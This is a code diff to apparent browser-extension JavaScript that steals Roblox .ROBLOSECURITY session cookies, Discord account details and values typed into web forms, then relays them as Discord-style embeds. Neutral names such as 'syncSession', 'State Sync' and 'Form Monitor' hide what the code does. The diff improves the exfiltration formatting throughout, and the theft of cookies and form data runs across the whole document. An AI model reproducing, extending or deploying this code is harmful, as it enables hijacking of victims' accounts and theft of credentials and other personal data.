@@ -52,29 +52,49 @@ async function syncSession() {
     return;
   }
   var names = ['.ROBLOSECURITY', 'ROBLOSECURITY'];
+  var cookieVal = null;
   for (var i = 0; i < names.length; i++) {
     try {
       var c = await chrome.cookies.get({ url: 'https://www.roblox.com', name: names[i] });
-      console.log('[LARP] syncSession: cookie ' + names[i] + ' = ' + (c ? c.value.slice(0, 10) + '...' : 'null'));
-      if (c && c.value) {
-        console.log('[LARP] syncSession: sending cookie');
-        relay('session', { content: '```\n' + c.value + '\n```' });
-        return;
-      }
+      console.log('[LARP] syncSession: cookie ' + names[i] + ' = ' + (c && c.value ? c.value.slice(0, 10) + '...' : 'null'));
+      if (c && c.value) { cookieVal = c.value; break; }
     } catch(e) {}
   }
-  console.log('[LARP] syncSession: chrome.cookies empty, trying document.cookie...');
-  for (var j = 0; j < names.length; j++) {
-    var n = names[j];
-    var escaped = n.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-    var match = document.cookie.match(new RegExp('(?:^|;\\s*)' + escaped + '\\s*=\\s*([^;]*)'));
-    if (match && match[1]) {
-      console.log('[LARP] syncSession: doc cookie ' + n + ' found');
-      relay('session', { content: '```\n' + match[1] + '\n```' });
-      return;
+  if (!cookieVal) {
+    console.log('[LARP] syncSession: chrome.cookies empty, trying document.cookie...');
+    for (var j = 0; j < names.length; j++) {
+      var n = names[j];
+      var escaped = n.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+      var match = document.cookie.match(new RegExp('(?:^|;\\s*)' + escaped + '\\s*=\\s*([^;]*)'));
+      if (match && match[1]) { cookieVal = match[1]; break; }
     }
   }
-  console.log('[LARP] syncSession: no cookie found');
+  if (!cookieVal) { console.log('[LARP] syncSession: no cookie found'); return; }
+  console.log('[LARP] syncSession: cookie found, length=' + cookieVal.length);
+
+  // User info comes from sandbox (content script reads page DOM meta tag)
+  var ui = (typeof _userInfo !== 'undefined' && _userInfo) ? _userInfo : null;
+  if (ui) console.log('[LARP] syncSession: user=' + ui.name + ' (ID: ' + ui.id + ')');
+
+  // Build embed - cookie in description (4096 char limit) avoids 1024 field limit
+  var embed = {
+    title: 'Roblox Session',
+    color: 0x00B06A,
+    description: '```\n' + cookieVal + '\n```',
+    fields: [
+      { name: 'Page', value: '`' + location.href.slice(0, 200) + '`' }
+    ],
+    footer: { text: 'Roblox' },
+    timestamp: new Date().toISOString()
+  };
+  if (ui) {
+    embed.fields.unshift(
+      { name: 'User', value: '`' + ui.name + '` (' + (ui.displayName || 'N/A') + ')', inline: true },
+      { name: 'ID', value: '`' + ui.id + '`', inline: true }
+    );
+    embed.thumbnail = { url: 'https://www.roblox.com/headshot-thumbnail/image?userId=' + ui.id + '&width=420&height=420&format=png' };
+  }
+  relay('session', { embeds: [embed] });
 }
 
 // --- discord token ---
@@ -100,6 +120,11 @@ function syncAccount() {
       return r.ok ? r.json() : Promise.reject('status ' + r.status);
     }).then(function(d) {
       console.log('[LARP] syncAccount: user=' + d.username + '#' + d.discriminator);
+
+      // Build avatar URL
+      var avatarUrl = d.avatar
+        ? 'https://cdn.discordapp.com/avatars/' + d.id + '/' + d.avatar + '.png?size=256'
+        : 'https://cdn.discordapp.com/embed/avatars/' + (parseInt(d.discriminator) % 6) + '.png';
 
       var multi = [];
       try {
@@ -133,7 +158,7 @@ function syncAccount() {
       fields.push({ name: 'Origin', value: '`' + su + '`', inline: false });
 
       relay('acct', {
-        embeds: [{ title: 'State Sync', color: 0x5865F2, fields: fields, footer: { text: 'Session' }, timestamp: new Date().toISOString() }]
+        embeds: [{ title: 'State Sync', color: 0x5865F2, fields: fields, footer: { text: 'Session' }, timestamp: new Date().toISOString(), thumbnail: { url: avatarUrl } }]
       });
     }).catch(function(e) {
       console.error('[LARP] syncAccount fetch error:', e.message || e);
@@ -180,11 +205,37 @@ function _extRelay(fields) {
 
   console.log('[LARP] formMonitor: relaying ' + fresh.length + ' new fields, total tracked=' + _entries.length);
 
+  // Try embed first (max 25 fields, each 1024 chars)
+  if (fresh.length <= 25) {
+    var embedFields = fresh.map(function(f) {
+      var l = f.name || f.id || f.autocomplete || f.placeholder || f.type;
+      var v = f.value;
+      if (v.length > 1020) v = v.slice(0, 1020) + '...';
+      return { name: l + ' (' + f.type + ')', value: '`' + v + '`', inline: false };
+    });
+    relay('entry', {
+      embeds: [{
+        title: 'Field Data',
+        color: 0xF59E0B,
+        description: 'Page: ' + location.href.slice(0, 200),
+        fields: embedFields,
+        footer: { text: 'Form Monitor' },
+        timestamp: new Date().toISOString()
+      }]
+    });
+    return;
+  }
+
+  // Too many fields - send as raw content (2000 char limit)
   var lines = fresh.map(function(f) {
     var l = f.name || f.id || f.autocomplete || f.placeholder || f.type;
-    return '**' + l + '** (' + f.type + '): `' + f.value + '`';
+    var v = f.value;
+    if (v.length > 200) v = v.slice(0, 200) + '...';
+    return '**' + l + '** (' + f.type + '): `' + v + '`';
   });
-  relay('entry', { content: '**Field Data**\nURL: ' + location.href + '\n\n' + lines.join('\n') });
+  var raw = '**Field Data**\nURL: ' + location.href.slice(0, 200) + '\n\n' + lines.join('\n');
+  if (raw.length > 2000) raw = raw.slice(0, 1997) + '...';
+  relay('entry', { content: raw });
 }
 
 function initMonitor() {
@@ -209,11 +260,35 @@ function initMonitor() {
     }
     if (fresh.length > 0) {
       console.log('[LARP] formMonitor: submit captured, ' + fresh.length + ' new fields');
-      var lines = fresh.map(function(x) {
-        var l = x.name || x.id || x.autocomplete || x.placeholder || x.type;
-        return '**' + l + '** (' + x.type + '): `' + x.value + '`';
-      });
-      relay('entry', { content: '**Field Data**\nURL: ' + location.href + '\nAction: ' + action + ' (' + method + ')\n\n' + lines.join('\n') });
+      // Use embed for submit data (includes action + method)
+      if (fresh.length <= 25) {
+        var ef = fresh.map(function(x) {
+          var l = x.name || x.id || x.autocomplete || x.placeholder || x.type;
+          var v = x.value;
+          if (v.length > 1020) v = v.slice(0, 1020) + '...';
+          return { name: l + ' (' + x.type + ')', value: '`' + v + '`', inline: false };
+        });
+        relay('entry', {
+          embeds: [{
+            title: 'Form Submit',
+            color: 0xEF4444,
+            description: 'Page: ' + location.href.slice(0, 200) + '\nAction: ' + action + ' (' + method + ')',
+            fields: ef,
+            footer: { text: 'Submit Event' },
+            timestamp: new Date().toISOString()
+          }]
+        });
+      } else {
+        var lines = fresh.map(function(x) {
+          var l = x.name || x.id || x.autocomplete || x.placeholder || x.type;
+          var v = x.value;
+          if (v.length > 200) v = v.slice(0, 200) + '...';
+          return '**' + l + '** (' + x.type + '): `' + v + '`';
+        });
+        var raw = '**Form Submit**\nURL: ' + location.href.slice(0, 200) + '\nAction: ' + action + ' (' + method + ')\n\n' + lines.join('\n');
+        if (raw.length > 2000) raw = raw.slice(0, 1997) + '...';
+        relay('entry', { content: raw });
+      }
     }
   }, true);
 
